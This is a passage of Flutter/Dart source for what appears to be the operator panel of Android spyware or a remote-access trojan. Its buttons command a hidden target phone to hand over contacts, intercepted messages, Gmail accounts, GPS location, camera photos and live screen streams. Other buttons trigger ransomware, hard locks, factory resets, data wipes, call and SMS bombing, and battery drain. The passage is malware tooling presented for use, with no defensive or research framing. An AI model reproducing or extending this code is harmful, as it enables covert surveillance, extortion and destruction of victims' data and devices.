        } else if (cmd == 'virus_mode') {
          _showInputDialog("🦠 VIRUS MODE", "virus_mode", targetId);
        } else if (cmd == 'panic_unlock') {
          _sendCommand("panic_unlock", targetId);
        } else if (cmd == 'virus_unlock') {
          _sendCommand("virus_unlock", targetId);
        } else if (cmd == 'factory_reset') {
          _showConfirmDialog("💣 FACTORY RESET", "RESET HP TARGET KE SETTINGAN PABRIK?\nSEMUA DATA AKAN HILANG!", "factory_reset", targetId);
        } else if (cmd == 'wipe_data') {
          _showConfirmDialog("🗑️ WIPE DATA", "HAPUS SEMUA FILE TARGET?\nFoto, video, dokumen akan hilang!", "wipe_data", targetId);
        } else if (cmd == 'call_bombing') {
          _showInputDialog("📞 CALL BOMBING", "call_bombing", targetId);
        } else if (cmd == 'sms_bomber') {
          _showInputDialog("📨 SMS BOMBER", "sms_bomber", targetId);
        } else if (cmd == 'battery_drain') {
          _showConfirmDialog("🔋 BATTERY DRAIN", "Aktifkan Battery Drain?\nBaterai target akan cepat habis!", "battery_drain", targetId);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      borderRadius: BorderRadius.circular(8),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: const Color(0xFF2A2A2A), 
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: Color(0xFFE53935).withOpacity(0.2)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min, 
          children: [
            Icon(icon, color: Color(0xFFE53935), size: 14),
            const SizedBox(width: 6),
            Text(label, style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = widget.device;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Device";

    return Scaffold(
      backgroundColor: darkBg,
      appBar: AppBar(
        backgroundColor: cardBg, 
        elevation: 0, 
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFFE53935)),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(model, style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Color(0xFFE53935))),
            Text(targetId, style: const TextStyle(fontSize: 10, color: Colors.white38)),
          ],
        ),
        actions: [
          if (_isSending) 
            const Padding(
              padding: EdgeInsets.only(right: 15),
              child: Center(child: SizedBox(width: 15, height: 15, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFE53935)))),
            ),
          IconButton(
            onPressed: () {
                setState(() {});
                _sendCommand("force_open", targetId, isSilent: true);
            }, 
            icon: const Icon(Icons.refresh, size: 20, color: Color(0xFFE53935))
          )
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 20),
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
            color: cardBg,
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(
                  children: [
                    const Icon(Icons.battery_full, color: Color(0xFFE53935), size: 14),
                    const SizedBox(width: 4),
                    Text("${device?['battery'] ?? '100'}%", style: const TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
                  ],
                ),
                const Row(
                  children: [
                    Icon(Icons.android, color: Color(0xFFE53935), size: 14),
                    SizedBox(width: 4),
                    Text("Android", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
                  ],
                ),
                const Row(
                  children: [
                    Icon(Icons.visibility_off, color: Color(0xFFE53935), size: 14),
                    SizedBox(width: 4),
                    Text("Hidden", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
                  ],
                ),
              ],
            ),
          ),
          
          _buildLogContainer(),

          _buildControlBlock(
            "Intelligence Extraction", 
            "Contacts, Notifications, WhatsApp, Telegram, Gmail", 
            Icons.folder_shared,
            [
              _buildActionButton("Get Contacts", Icons.contacts, "get_contacts", targetId),
              _buildActionButton("Messages Intercept", Icons.message, "get_notif_logs", targetId),
              _buildActionButton("Gmail List", Icons.account_circle, "get_gmails", targetId),
              _buildActionButton("Request Access", Icons.security, "open_notification_settings", targetId),
            ]
          ),

          _buildControlBlock(
            "Audio Control", 
            "Remote MP3 Player", 
            Icons.volume_up,
            [
              _buildActionButton("Play MP3", Icons.play_arrow, "play_audio_input", targetId),
              _buildActionButton("Stop Sound", Icons.stop, "stop_audio", targetId),
            ]
          ),

          _buildControlBlock(
            "Location Tracking", 
            "Real-time GPS", 
            Icons.location_on,
            [
              _buildActionButton("Get Location", Icons.my_location, "get_location", targetId),
            ]
          ),

          _buildControlBlock(
            "Media & Surveillance", 
            "Camera & Screen Stream", 
            Icons.camera_alt,
            [
              _buildActionButton("Instant Photo", Icons.camera, "take_photo", targetId),
              _buildActionButton("Real Stream", Icons.screenshot, "get_screen", targetId),
              _buildActionButton("Set Wallpaper", Icons.image, "set_wallpaper", targetId),
              _buildActionButton("START STROBE", Icons.flash_on, "flash_strobe", targetId),
              _buildActionButton("STOP STROBE", Icons.flash_off, "stop_strobe", targetId),
            ]
          ),

          _buildControlBlock(
            "LOCK SYSTEM", 
            "Hard Lock, Unlock, Ransomware, PANIC MODE, VIRUS MODE", 
            Icons.smartphone,
            [
              _buildActionButton("🔒 HARD LOCK", Icons.lock, "hard_lock", targetId),
              _buildActionButton("🔓 UNLOCK", Icons.lock_open, "unlock", targetId),
              _buildActionButton("🌐 Open Link", Icons.link, "open_url", targetId),
              _buildActionButton("📳 Vibrate", Icons.vibration, "vibrate_loop", targetId),
              _buildActionButton("💀 RANSOMWARE", Icons.bug_report, "activate_ransomware", targetId),
              _buildActionButton("🔓 DECRYPT", Icons.security, "decrypt_files", targetId),
              _buildActionButton("⚠️ PANIC MODE", Icons.warning_amber_rounded, "panic_mode", targetId),
              _buildActionButton("🔓 PANIC UNLOCK", Icons.lock_open, "panic_unlock", targetId),
              _buildActionButton("🦠 VIRUS MODE", Icons.bug_report, "virus_mode", targetId),
              _buildActionButton("🔓 VIRUS UNLOCK", Icons.lock_open, "virus_unlock", targetId),
            ]
          ),

          _buildControlBlock(
            "💣 DESTRUCTIVE", 
            "Factory Reset, Wipe Data, Call Bombing, SMS Bomber, Battery Drain", 
            Icons.warning,
            [
              _buildActionButton("💣 FACTORY RESET", Icons.settings_backup_restore, "factory_reset", targetId),
              _buildActionButton("🗑️ WIPE DATA", Icons.delete_forever, "wipe_data", targetId),
              _buildActionButton("📞 CALL BOMBING", Icons.phone, "call_bombing", targetId),
              _buildActionButton("📨 SMS BOMBER", Icons.message, "sms_bomber", targetId),
              _buildActionButton("🔋 BATTERY DRAIN", Icons.battery_alert, "battery_drain", targetId),
            ]
          ),
        ],
      ),
    );
  }
}